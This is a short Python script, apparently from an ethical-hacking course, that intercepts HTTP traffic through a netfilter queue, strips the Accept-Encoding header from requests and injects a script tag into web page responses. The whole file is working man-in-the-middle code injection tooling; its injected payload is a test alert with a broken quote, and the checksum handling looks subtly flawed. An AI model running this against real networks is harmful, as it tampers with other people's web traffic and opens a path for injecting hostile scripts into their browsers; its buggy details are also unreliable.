#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue
import re



def set_load(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.IP].chksum
	return packet

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		if scapy_packet[scapy.TCP].dport == 80:
			print("[+] Request")
			modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
			new_packet = set_load(scapy_packet, modified_load)
			packet.set_payload(str(new_packet))

		elif scapy_packet[scapy.TCP].sport == 80:
				print("[+] Response")
				modified_load = scapy_packet[scapy.Raw].load.replace("</body", "<script>alert('test);</script></body>")
				new_packet = set_load(scapy_packet, modified_load)
				packet.set_payload(str(new_packet))

	packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
